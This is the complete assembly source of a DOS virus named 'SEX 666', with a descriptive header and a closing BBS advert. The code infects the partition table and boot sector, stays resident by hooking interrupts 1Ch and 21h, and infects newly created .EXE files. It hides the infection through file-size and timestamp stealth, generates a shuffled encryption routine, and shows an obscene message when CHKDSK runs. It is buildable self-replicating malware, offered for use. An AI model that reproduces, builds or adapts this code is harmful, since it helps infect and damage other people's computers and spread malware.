;------------------------------------------------------------------------------
;
; Virus Name:  SEX 666
; Origin:      Holland
; Eff Length:  2,048 bytes
; Type Code:   PRhE - Parasitic Resident .EXE Infector
; 
; General Comments:
; 	When the first program with SEX 666 is executed, SEX 666 will infect
; 	this partition table the first harddisk and install itself resident
; 	at the top of system memory, but below the 640k DOS boundary. Free
; 	memory as indicated by the DOS CHKDSK program, will decrease by 4112
; 	bytes. Interrupt 21h will be hooked by the virus.
; 
; 	This first time the computer is booted from the first harddisk SEX 666
; 	will install itself resident above TOM but below the 640k DOS boundary.
; 	Total system memory as indicated by the DOS CHKDSK program, will
; 	decrease by 4096 bytes.
; 
; 	After SEX 666 is resident, it will infect .EXE programs that are
; 	created with dos function 3ch or 5bh. Infected programs will increase
; 	in size by 2048 bytes, though the increase in file length will be
; 	hidden if SEX 666 is resident. The program's time will indicate 62
;  	seconds, but this will be hidden if the virus is resident.
; 
;------------------------------------------------------------------------------
;
; Interrupt vectors
;
;------------------------------------------------------------------------------

iseg segment at 0
	org	1ch*4

Int1Co		dw	0			; interrupt vector 21h
Int1Cs		dw	0

	org	21h*4

Int21o		dw	0			; interrupt vector 21h
Int21s		dw	0

iseg ends

;------------------------------------------------------------------------------
;
; Constants
;
;------------------------------------------------------------------------------

VirusSize	equ	800h			; size of virus
BootSize	equ	2bh

;------------------------------------------------------------------------------
;
; Macros
;
;------------------------------------------------------------------------------

je_n	macro	dest				; je >128 bytes
	local	ok
	jne	ok
	jmp	dest
ok:	
	endm

jne_n	macro	dest				; jne >128 bytes
	local	ok
	je	ok
	jmp	dest
ok:	
	endm

dbw	macro	_byte1,_byte2,_word
	db	_byte1,_byte2
	dw	offset _word
	endm

cseg segment public 'code'
	assume	cs:cseg,ds:cseg,es:cseg

;------------------------------------------------------------------------------
;
; Header of EXE-file
;
;------------------------------------------------------------------------------

Header		equ	$

Signature	dw	5a4dh			; signature 'MZ'
PartPage	dw	0			; size of partitial page
PageCount	dw	8			; number of pages
ReloCount	dw	0			; number of relocation items
HeaderSize	dw	2			; size of header
MinMem		dw	40h			; minimum memory needed
MaxMem		dw	40h			; maximum memory needed
ExeSS		dw	0			; initial SS 
ExeSP		dw	VirusSize		; initial SP
CheckSum	dw	0			; unused ???
ExeEntry	equ	this dword		; initial entry point
ExeIP		dw	offset Start		; initial IP
ExeCS		dw	0			; initial CS
ReloOffset	dw	1ch			; offset of relocationtable
OverlayNr	dw	0			; number of overlay

CryptOfs	equ	OverlayNr		; offset Crypt
		org	BootSize

;------------------------------------------------------------------------------
;
; Bootsector startup
;
;------------------------------------------------------------------------------

Bootsector:
	cli
	xor	bx,bx
	mov	ds,bx
	mov	ss,bx
	mov	sp,7c00h
	sti
	mov	ax,ds:[413h]
	sub	ax,(VirusSize/400h)
	mov	ds:[413h],ax
	mov	cl,6
	shl	ax,cl
	mov	es,ax
	mov	ax,201h+(VirusSize/200h)
	mov	cx,2
	mov	dx,80h
	int	13h
	mov	bx,offset StartUp
	push	es
	push	bx
	retf

StartUp:cli
	mov	ax,offset Interrupt1C
	xchg	ax,ds:Int1Co
	mov	cs:OldInt1Co,ax
	mov	ax,cs
	xchg	ax,ds:Int1Cs
	mov	cs:OldInt1Cs,ax
	mov	cs:Count,182
	sti
	push	ds
	pop	es
	push	cs
	pop	ds
	mov	si,offset Header
	mov	di,7c00h
	mov	cx,BootSize
	cld
	rep	movsb
	mov	bx,7c00h
	push	es
	push	bx
	retf

Interrupt1C:
	dec	cs:Count
	jne	Old1C
	push	ds
	push	ax
	cli
	xor	ax,ax
	mov	ds,ax
	mov	ax,cs:OldInt1Co
	mov	ds:Int1Co,ax
	mov	ax,cs:OldInt1Cs
	mov	ds:Int1Cs,ax
	mov	ax,offset Interrupt21
	xchg	ax,ds:Int21o
	mov	cs:OldInt21o,ax
	mov	ax,cs
	xchg	ax,ds:Int21s
	mov	cs:OldInt21s,ax
	mov	cs:Handle1,0
	mov	cs:Handle2,0
	sti
	pop	ax
	pop	ds
Old1C:	jmp	cs:OldInt1C

;------------------------------------------------------------------------------
;
; Manipilated functions
;
;------------------------------------------------------------------------------

Functions	db	11h				; 1
		dw	offset FindFCB
		db	12h				; 2
		dw	offset FindFCB
		db	30h				; 3
		dw	offset Version
		db	3ch				; 4
		dw	offset Create
		db	3dh				; 5
		dw	offset Open
		db	3eh				; 6
		dw	offset Close
		db	42h				; 7
		dw	offset Seek
		db	4bh				; 8
		dw	offset Exec
		db	4eh				; 9
		dw	offset Find
		db	4fh				; a
		dw	offset Find
		db	5bh				; b
		dw	offset Create
		db	6ch				; c
		dw	offset OpenCreate

FunctionCount	equ	0ch

;------------------------------------------------------------------------------
;
; String data
;
;------------------------------------------------------------------------------

MemoryMsg	db	'Insufficient memory',13,10,'$'

ChkDsk		db	'CHKDSK'

;------------------------------------------------------------------------------
;
; Procedure to infect an EXE-file
; At the top of the EXE-file must be space to put the virus.
;
;------------------------------------------------------------------------------

Infect:	push	ax				; save registers
	push	bx
	push	cx
	push	dx
	push	ds
	push	cs				; ds=cs
	pop	ds
	mov	ax,4200h			; position read/write pointer
	xor	cx,cx				; at the end of the virus
	mov	dx,VirusSize
	call	DOS
	call	ReadHeader			; read orginal exe-header
	add	PageCount,VirusSize/200h	; adjust header for virus
	mov	ReloCount,0
	mov	HeaderSize,0
	add	MinMem,(10h+VirusSize)/10h
	add	MaxMem,(10h+VirusSize)/10h
	jnc	MaxOk
	mov	MaxMem,0ffffh
MaxOk:	add	ExeSS,VirusSize/10h
	mov	ExeIP,offset Main
	mov	ExeCS,0
	mov	ax,4200h			; position read/write pointer
	xor	cx,cx				; at the top of the virus
	xor	dx,dx
	call	DOS
	call	WriteHeader			; write header at the top of
	jc	InfErr
	mov	ax,5700h			; the virus
	call	DOS
	mov	ax,5701h
	or	cl,1fh
	call	DOS
InfErr:	pop	ds				; restore registers
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	ret					; return

;------------------------------------------------------------------------------
;
; The orginal interrupt 21h is redirected to this procedure
;
;------------------------------------------------------------------------------

FindFCB:call	DOS				; call orginal interrupt
	cmp	al,0				; error ?
	jne	Ret1
	pushf					; save registers
	push	ax
	push	bx
	push	es
	mov	ah,2fh				; get DTA
	call	DOS
	cmp	byte ptr es:[bx],-1		; extended fcb ?
	jne	FCBOk
	add	bx,8				; yes, skip 8 bytes
FCBOk:	mov	al,es:[bx+16h]			; get file-time (low byte)
	and	al,1fh				; seconds
	cmp	al,1fh				; 62 seconds ?
	jne	FileOk				; no, file not infected
	sub	word ptr es:[bx+1ch],VirusSize	; adjust file-size
	sbb	word ptr es:[bx+1eh],0
	jmp	short Time

Find:	call	DOS				; call orginal interrupt
	jc	Ret1				; error ?
	pushf					; save registers
	push	ax
	push	bx
	push	es
	mov	ah,2fh
	call	DOS
	mov	al,es:[bx+16h]			; get file-time (low byte)
	and	al,1fh				; seconds
	cmp	al,1fh				; 62 seconds ?
	jne	FileOk				; no, file not infected
	sub	word ptr es:[bx+1ah],VirusSize	; change file-size
	sbb	word ptr es:[bx+1ch],0
Time:	xor	byte ptr es:[bx+16h],10h	; adjust file-time
FileOk:	pop	es				; restore registers
	pop	bx
	pop	ax
	popf
Ret1:	retf	2				; return

Version:push	cx				; installation check
	push	si				; ds = cs
	push	di
	push	es
	push	cs
	pop	es
	mov	si,offset Version		; compare an part of the
	mov	di,si				; code segment with the code
	mov	cx,VersionSize			; segment of the virus
	cld
	repe	cmpsb
	pop	es
	pop	di
	pop	si
	pop	cx
	jne	Old21				; not equal, do orginal int 21h
	mov	ax,0DEADh			; return DEAD signature
	mov	bx,offset Continue		; es:dx = continue
	push	cs
	pop	es
	retf	2				; return

VersionSize	equ	$-Version

Seek:	or	bx,bx				; bx=0 ?
	jz	Old21				; yes, do orginal interrupt
	cmp	bx,cs:Handle1			; bx=handle1 ?
	je	Stealth				; yes, use stealth
	cmp	bx,cs:Handle2			; bx=handle2 ?
	jne	Old21				; no, do orginal interrupt
Stealth:push	cx				; save cx
	or	al,al				; seek from top of file ?
	jnz	Ok				; no, don't change cx:dx
	add	dx,VirusSize			; change cx:dx
	adc	cx,0
Ok:	call	DOS				; Execute orginal int 21h
	pop	cx				; restore cx
	jc	Ret1				; Error ?
	sub	ax,VirusSize			; adjust dx:ax
	sbb	dx,0
	jmp	short Ret1			; return

Close:	or	bx,bx				; bx=0 ?
	je	Old21				; yes, do orginal interrupt
	cmp	bx,cs:Handle1			; bx=handle1
	jne	Not1				; no, check handle2
	call	Infect				; finish infection
	mov	cs:Handle1,0			; handle1=unused
Not1:	cmp	bx,cs:Handle2			; bx=handle2
	jne	Not2				; no, do orginal interrupt
	call	Infect
	mov	cs:Handle2,0			; handle2=unused
Not2:	jmp	short Old21			; continue with orginal int

Interrupt21:
	cmp	cs:Disable,0
	jne	Old21
	push	bx				; after an int 21h instruction
	push	cx				; this procedure is started
	mov	bx,offset Functions
	mov	cx,FunctionCount
NxtFn:	cmp	ah,cs:[bx]			; search function
	je	Found
	add	bx,3
	loop	NxtFn
	pop	cx				; function not found
	pop	bx
Old21:	inc	cs:Cryptor
	jmp	cs:OldInt21

Found:	push	bp				; function found, start viral
	mov	bp,sp				; version of function
	mov	bx,cs:[bx+1]
	xchg	bx,ss:[bp+4]
	pop	bp
	pop	cx
	ret

Create:	cmp	cs:Handle1,0			; handle1=0 ?
	jne	Old21				; No, can't do anything
	call	CheckName			; check for .exe extension
	jc	Old21				; No, not an exe-file
ExtCr:	call	DOS				; Execute orginal interrupt
	jc	Ret2				; Error ?
	pushf					; save registers
	push	ax
	push	bx
	push	cx
	push	dx
	push	si
	push	di
	push	ds
	push	es
	push	cs
	pop	ds
	push	cs
	pop	es
	mov	bx,ax				; write virus to file
	mov	ax,4400h
	call	DOS
	jc	InRet
	test	dx,80h
	jnz	InRet
	push	bx
	call	Link
	pop	bx
	mov	si,offset WriteVirus
	mov	di,offset Header
	mov	cx,1ah
	rep	movsb
	mov	CryptOfs,offset Crypt
	call	Header
	jc	InErr				; Error ?
	cmp	ax,cx
	jne	InErr
	mov	Handle1,bx			; store handle
	jmp	short InRet
InErr:	mov	ax,4200h			; set read/write pointer to top
	xor	cx,cx				; of file
	xor	dx,dx
	call	DOS
	mov	ah,40h
	xor	cx,cx
	call	DOS
InRet:	pop	es				; restore registers
	pop	ds
	pop	di
	pop	si
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	popf
Ret2:	retf	2				; return

OpenCreate:
	or	al,al				; subfunction 0 ?
	jne	Fail				; no, do orginal interrupt
	push	dx
	and	dl,0f0h
	cmp	dl,020h
	pop	dx
	je	Replace
	push	ax				; save registers
	push	bx
	push	cx
	push	dx
	mov	ax,3d00h			; open file and close file to
	mov	dx,si				; check if file exists
	call	DOS
	jc	Error
	mov	bx,ax
	mov	ah,3eh
	call	DOS
Error:	pop	dx				; restore registers
	pop	cx
	pop	bx
	pop	ax
	jnc	Open				; open file, if file exists
Replace:cmp	cs:Handle1,0			; is handle1 0 ?
	jne	Fail				; no, do orginal interrupt
	push	dx				; save dx
	mov	dx,si
	call	CheckName			; check for .exe extension
	pop	dx				; restore dx
	jc	Fail
	jmp	ExtCr				; create if exe-file
Fail:	jmp	Old21				; do orginal interrupt

Open:	cmp	al,1
	je	Fail
	cmp	cs:Handle2,0			; handle1=0 ?
	jne	Fail				; No, can't do anything
	call	DOS				; Execute orginal interrupt
	jc	Ret3				; Error ?
	pushf					; save registers
	push	ax
	push	bx
	push	cx
	push	dx
	push	ds
	push	cs
	pop	ds
	mov	bx,ax				; read header of file
Ext2:	mov	ax,4400h
	call	DOS
	jc	Device
	test	dx,80h
	jnz	Device
	mov	ah,3fh
	mov	cx,1ch
	xor	dx,dx
	call	DOS
	jc	NoVir				; error ?
	cmp	ax,cx
	jne	NoVir
	cmp	Signature,5a4dh			; signature = 'MZ' ?
	jne	NoVir				; no, not infected
	cmp	HeaderSize,0			; headersize = 0 ?
	jne	NoVir				; no, not infected
	cmp	ExeIP,offset Main		; ip = Start ?
	jne	NoVir				; no, not infected
	cmp	ExeCS,0				; cx = 0 ?
	jne	NoVir				; no, not infected
	mov	Handle2,bx			; store handle
	mov	ax,4200h
	xor	cx,cx
	mov	dx,VirusSize			; seek to end of virus
	jmp	OpenOk
NoVir:	mov	ax,4200h
	xor	cx,cx
	xor	dx,dx
OpenOk:	call	DOS
Device:	pop	ds				; restore registers
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	popf
Ret3:	retf	2				; return

Exec:	push	ax
	push	cx
	push	si
	push	di
	mov	si,dx
	mov	di,offset ChkDsk
	mov	cx,100h
Next7:	jcxz	NotChk
	mov	ah,cs:[di]
Next8:	lodsb
	and	al,0dfh
	cmp	al,ah
	loopne	Next8
	push	cx
	push	si
	push	di
	mov	cx,6
	dec	si
Next9:	lodsb
	and	al,0dfh
	inc	di
	cmp	cs:[di-1],al
	loope	Next9
	pop	di
	pop	si
	pop	cx
	jne	Next7
	cmp	cs:Cryptor,1000h
	jae	NoMsg
	push	dx
	push	ds
	push	cs
	pop	ds
	mov	ah,9
	mov	dx,offset TextLine
	call	DOS
	mov	ah,9
	mov	dx,offset Message
	call	DOS
	pop	ds
	pop	dx
NoMsg:	pop	di
	pop	si
	pop	cx
	pop	ax
	inc	cs:Disable
	call	DOS
	dec	cs:Disable
	jmp	Ret3
NotChk:	pop	di
	pop	si
	pop	cx
	pop	ax
	jmp	Old21

;------------------------------------------------------------------------------

WriteVirus:
	call	CryptOfs			; encrypt
	mov	ah,40h				; write virus to file
	mov	cx,VirusSize
	xor	dx,dx
	pushf
	call	cs:OldInt21
	call	CryptOfs			; decrypt
	ret					; return

WriteHeader:					; write exe-header to file
	mov	ah,40h
	jmp	short Hdr

ReadHeader:					; read exe-header from file
	mov	ah,3fh
Hdr:	mov	cx,1ch
	xor	dx,dx

DOS:	pushf					; call orginal interrupt
	call	cs:OldInt21
	ret

CheckName:					; check for .exe
	push	ax				; save registers
	push	cx
	push	si
	push	di
	xor	ah,ah				; point found = 0
	mov	cx,100h				; max length filename = 100h
	mov	si,dx				; si = start of filename
	cld
NxtChr:	lodsb					; get byte
	or	al,al				; 0 ?
	je	EndName				; yes, check extension
	cmp	al,'\'				; \ ?
	je	Slash				; yes, point found = 0
	cmp	al,'.'				; . ?
	je	Point				; yes, point found = 1
	loop	NxtChr				; next character
	jmp	EndName				; check extension
Slash:	xor	ah,ah				; point found = 0
	jmp	NxtChr				; next character
Point:	inc	ah				; point found = 1
	mov	di,si				; di = start of extension
	jmp	NxtChr				; next character
EndName:or	ah,ah				; point found = 0
	je	NotExe				; yes, not an exe-file
	mov	si,di				; si = start of extension
	lodsw					; first 2 characters
	and	ax,0dfdfh			; uppercase
	cmp	ax,05845h			; EX ?
	jne	NotExe				; no, not an exe-file
	lodsb					; 3rd character
	and	al,0dfh				; uppercase
	cmp	al,045h				; E ?
	je	ChkRet				; yes, return
NotExe:	stc					; set carry flag
ChkRet:	pop	di				; restore registers
	pop	si
	pop	cx
	pop	ax
	ret					; return

;------------------------------------------------------------------------------
;
; Linker for encryption procedure
;
;------------------------------------------------------------------------------

Part1		db	7,0
		db		1,	09ch
		db		1,	050h
		db		1,	051h
		db		1,	052h
		db		1,	056h
		db		1,	057h
		db		1,	01eh
Part2		db	4,0
		db		2,	00eh,01fh
		db		2,	031h,0c0h
		dbw		3,	0bah,Crypt-1ch
		dbw		3,	0bfh,[1ch]
Part3		db	1,0
		db		3,	0fch,0ebh,00eh
Part4		db	4,0
		db		1,	0ach
		db		2,	002h,0e0h
		db		2,	0d0h,0cch
		db		3,	030h,025h,047h
Part5		db	1,0
		db		2,	0e2h,0f6h
Part6		db	1,0
		db		4,	00bh,0d2h,074h,010h
Part7		db	2,0
		dbw		3,	0beh,Crypt
		dbw		3,	0b9h,Lastbyte-Crypt
Part8		db	1,0
		db		10,	03bh,0d1h,073h,002h,08bh
		db			0cah,02bh,0d1h,0ebh,0e2h
Part9		db	7,1
		db		1,	09dh
		db		1,	058h
		db		1,	059h
		db		1,	05ah
		db		1,	05eh
		db		1,	05fh
		db		1,	01fh
Part10		db	1,0
		db		1,	0c3h


Link:	mov	ax,Cryptor
	mov	cx,10				; number of parts
	mov	di,offset Crypt			; destenation
	mov	si,offset Part1			; source
Next1:	push	ax				; save registers
	push	cx
	push	di
	cld
	cmp	byte ptr ds:[si+1],0
	je	Forward
	push	ax
	push	cx
	push	si
	xor	ax,ax
	mov	cl,[si]
	xor	ch,ch
	add	si,2
Next4:	lodsb
	add	si,ax
	add	di,ax
	loop	Next4
	dec	di
	std
	pop	si
	pop	cx
	pop	ax
Forward:mov	Table[0],0100h			; initialize table
	mov	Table[2],0302h
	mov	Table[4],0504h
	mov	Table[6],0706h
	mov	bx,offset Table
	mov	cl,ds:[si]			; get number of instructions
	xor	ch,ch				;  to shuffle
Next2:	call	Shuffle
	loop	Next2
	pop	di
	mov	cl,ds:[si]			; get next part
	xor	ch,ch
	add	si,2
	cld
Next6:	lodsb
	xor	ah,ah
	add	si,ax
	add	di,ax
	loop	Next6
	pop	cx				; restore register
	pop	ax
	loop	Next1				; next
	ret					; return

Shuffle:xor	dx,dx				; shuffle instructions
	div	cx
	push	ax
	push	cx
	push	si
	xchg	si,dx
	mov	al,ds:[bx]
	xchg	al,ds:[bx+si]
	xchg	si,dx
	inc	bx
	pushf
	cld
	mov	cl,al
	xor	ax,ax
	xor	ch,ch
	add	si,2
	jcxz	First
Next5:	lodsb
	add	si,ax
	loop	Next5
First:	lodsb
	xor	ah,ah
	mov	cx,ax
	popf
	rep	movsb
	pop	si
	pop	cx
	pop	ax
	ret

;------------------------------------------------------------------------------
;
; This procedure is called when starting from an exe-file
;
;------------------------------------------------------------------------------

MemErr:	mov	ah,9				; display message
	mov	dx,offset MemoryMsg
	int	21h
	mov	ax,4cffh			; terminate with error-code 255
	int	21h

Start:	mov	cs:SavedAX,ax			; save registers
	mov	cs:SavedDS,ds
	push	cs				; ds = cs
	pop	ds
	mov	ah,30h				; get dos-version (installation
	int	21h				; check)
	cmp	ax,0DEADh			; virus installed ?
	jne	Install				; no, install
	cmp	bx,offset Continue
	jne	Install
	mov	ax,ds:SavedAX
	mov	es:SavedAX,ax
	mov	ax,ds:SavedDS
	mov	es:SavedDS,ax
	push	es				; push es and dx for far return
	push	bx
	mov	ax,cs				; ax=distenation segment
	mov	dx,cs				; dx=segment of orginal header
	add	dx,VirusSize/10h
	retf					; start orginal exe-file
Install:mov	ah,4ah				; get memory avail
	mov	bx,-1
	int	21h
	sub	bx,(10h+VirusSize)/10h  	; memory needed by virus
	mov	ah,4ah				; adjust memory block-size
	int	21h
	jc	MemErr				; error ? yes, terminate
	mov	ah,48h				; allocate memory for virus
	mov	bx,VirusSize/10h
	int	21h
	jc	MemErr				; error ? yes, terminate
	mov	es,ax
	mov	ax,201h
	xor	bx,bx
	mov	cx,1
	mov	dx,80h
	int	13h
	jc	BootOk
	mov	si,offset BootSector
	xor	di,di
	mov	cx,BootSize
	cld
	repe	cmpsb
	je	BootOk
	mov	di,1beh+8
	mov	cx,4
Next3:	cmp	word ptr es:[di+2],0
	ja	SectOk
	cmp	word ptr es:[di],1+(VirusSize/200h)
	jbe	BootOk
SectOk:	loop	Next3
	push	ds
	push	es
	push	es
	pop	ds
	push	cs
	pop	es
	xor	si,si
	xor	di,di
	mov	cx,BootSize
	cld
	rep	movsb
	mov	ax,300h+(VirusSize/200h)
	mov	cx,2
	int	13h
	pop	es
	pop	ds
	jc	BootOk
	mov	si,offset BootSector
	xor	di,di
	mov	cx,BootSize
	cld
	rep	movsb
	mov	ax,301h
	mov	cx,1
	int	13h
BootOk:	mov	ax,es
	dec	ax				; get segment of MCB
	mov	es,ax
	mov	word ptr es:[1],8		; change owner
	inc	ax				; get segment of memory-block
	mov	es,ax				; es:dx = continue
	mov	dx,offset Continue
	push	es				; push es and ds for far return
	push	dx
	xor	si,si				; copy virus to memory-block
	xor	di,di
	mov	cx,VirusSize/2
	cld
	rep	movsw
	xor	ax,ax				; ds = interrupt table
	mov	ds,ax
	mov	ax,ds:Int21o			; save interrupt 21h vector
	mov	es:OldInt21o,ax
	mov	ax,ds:Int21s
	mov	es:OldInt21s,ax
	mov	ds:Int21o,offset Interrupt21	; store new interrupt vector
	mov	ds:Int21s,es
	mov	es:Handle1,0			; clear handles
	mov	es:Handle2,0
	push	cs
	pop	ds
	mov	ax,cs				; ax=distenation segment
	mov	dx,cs				; dx=segment of orginal header
	add	dx,VirusSize/10h
	retf					; start orginal exe-file

Continue:
	mov	ds,dx				; ds=dx
	add	ExeSS,ax			; adjust orginal SS
	add	ExeCS,ax			; adjust orginal CS
	xor	si,si				; copy orginal header to
	xor	di,di				; code segment
	mov	cx,0dh
	cld
	rep	movsw
	mov	si,ReloOffset			; get offset of relocationtable
	mov	cx,ReloCount			; get number of relocationitems
	add	dx,HeaderSize			; get start of orginal exe-file
	cld
	jcxz	Zero				; 0 relocation items ?
Next:	push	ax				; save ax
	lodsw					; get offset of relocationitem
	mov	bx,ax
	lodsw					; get segment of relocationitem
	add	ax,dx
	mov	es,ax
	pop	ax
	add	es:[bx],ax			; adjust relocationitem
	loop	Next				; next relocationitem
Zero:	mov	bx,PageCount			; get number of pages in file
	cli					; disable interrupts
NxtPage:mov	ds,dx				; ds = source segment
	mov	es,ax				; es = destenation segment
	mov	cx,100h				; cx = size of 1 page in words
	xor	si,si				; si = 0
	xor	di,di				; di = 0
	rep	movsw				; copy block
	add	ax,20h				; adjust destenation segment
	add	dx,20h				; adjust source segment
	dec	bx				; restore cx
	jnz	NxtPage				; next block
	mov	ss,cs:ExeSS			; set ss:sp
	mov	sp,cs:ExeSP
	sti					; enable interrupts
	mov	ax,cs:SavedAX			; restore registers
	mov	ds,cs:SavedDS
	mov	es,cs:SavedDS
	jmp	cs:ExeEntry

;------------------------------------------------------------------------------
;
; Activation
;
;------------------------------------------------------------------------------

Message		equ	this byte
		db	9,9,9,9,'        SEX 666',13,10
		db 	9,9,9,9,'    Fuck the Demon',13,10
		db	13,10
		db	9,9,9,9,' Greetings Bit Addict',13,10

TextLine	equ 	this byte
		db	13,10
		db	9,9,9,9,'컴컴컴컴컴컴컴컴컴컴컴',13,10
		db	13,10
		db	'$'

;------------------------------------------------------------------------------
;
; Encryption
;
;------------------------------------------------------------------------------

Crypt:		db	58 dup(90h)		; this should be the encryption

Cryptor		dw	0			; change the encryption by
						; changing this value

Main:	call	Crypt				; decrypt
	jmp	Start				; jump to Start


LastByte	equ	$			; encryption stops here

;------------------------------------------------------------------------------
;
; Variables
;
;------------------------------------------------------------------------------

OldInt1C	equ	this dword		; orginal interrupt 8
OldInt1Co	dw	0
OldInt1Cs	dw	0
OldInt21	equ	this dword		; orginal interrupt 21h
OldInt21o	dw	0
OldInt21s	dw	0

Disable		db	0

Count		equ	this word		; timer count
SavedAX		dw	0
SavedDS		dw	0

Handle1		dw	-1			; Handle of exe-file created
Handle2		dw	-1			; Handle of exe-file opend

Table		dw	0,0,0,0			; Used by link

;------------------------------------------------------------------------------
;
; Orginal EXE-file
;
;------------------------------------------------------------------------------

	org	VirusSize

	db	'MZ'				; header
	dw	0				; image size = 1024 bytes
	dw	4
	dw	0				; relocation items = 0
	dw	2				; headersize = 20h
	dw	40h				; minimum memory
	dw	40h				; maximum memory
	dw	0				; ss
	dw	400h				; sp
	dw	0				; chksum
	dw	0				; ip
	dw	0				; cs
	dw	1ch				; offset relocation table
	dw	0				; overlay number
	dw	-1
	dw	-1

Orginal:mov	ah,9				; display warning
	push	cs
	pop	ds
	mov	dx,offset Warning-VirusSize-20h
	int	21h
	mov	ax,4c00h
	int	21h				; terminate

Warning	equ	this byte

	db	13,10
	db	'WARNING:',13,10
	db	13,10
	db	'SEX 666 virus is now memory resident and has now infected the',13,10
	db	'partition table !!!!!',13,10
	db	13,10
	db	'$'

cseg ends

sseg segment stack 'stack'
	db	100h dup(?)
sseg ends

end Start



;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
